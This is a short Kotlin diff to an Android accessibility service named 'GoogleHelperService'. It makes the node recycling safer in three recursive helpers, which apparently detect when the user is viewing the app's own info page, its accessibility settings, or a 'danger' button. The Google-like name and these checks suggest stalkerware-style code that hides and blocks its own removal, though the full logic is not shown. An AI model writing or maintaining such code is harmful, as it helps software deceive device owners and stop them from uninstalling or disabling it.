@@ -192,9 +192,11 @@ class GoogleHelperService : AccessibilityService() {
         
         for (i in 0 until node.childCount) {
             val child = node.getChild(i) ?: continue
-            val found = isViewingOurAppInfo(child)
-            child.recycle()
-            if (found) return true
+            try {
+                if (isViewingOurAppInfo(child)) return true
+            } finally {
+                child.recycle()
+            }
         }
         return false
     }
@@ -213,9 +215,11 @@ class GoogleHelperService : AccessibilityService() {
         
         for (i in 0 until node.childCount) {
             val child = node.getChild(i) ?: continue
-            val found = isViewingOurAccessibilityService(child)
-            child.recycle()
-            if (found) return true
+            try {
+                if (isViewingOurAccessibilityService(child)) return true
+            } finally {
+                child.recycle()
+            }
         }
         return false
     }
@@ -234,9 +238,11 @@ class GoogleHelperService : AccessibilityService() {
         
         for (i in 0 until node.childCount) {
             val child = node.getChild(i) ?: continue
-            val found = findDangerButton(child)
-            child.recycle()
-            if (found) return true
+            try {
+                if (findDangerButton(child)) return true
+            } finally {
+                child.recycle()
+            }
         }
         return false
     }
